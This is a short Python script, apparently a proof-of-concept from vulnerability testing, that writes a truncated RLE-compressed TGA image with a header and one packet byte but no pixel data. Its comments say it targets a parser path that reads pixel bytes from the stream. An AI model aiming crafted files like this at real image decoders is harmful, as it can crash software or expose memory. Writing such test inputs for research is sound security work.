from pathlib import Path
import struct, os
# RLE TGA with 1x1 image but truncated after one RLE header and no pixel data.
# This targets the path that reads raw_data[j] from the stream for RLE pixels.
hdr = bytearray(18)
hdr[2] = 10  # RLE true-color image
hdr[12:14] = struct.pack('<H', 1)
hdr[14:16] = struct.pack('<H', 1)
hdr[16] = 24
# one RLE packet header indicating one pixel, but omit pixel bytes
payload = bytes([0x00])
Path('/workspace/poc2.tga').write_bytes(hdr + payload)
print('wrote', len(hdr)+len(payload))
PY
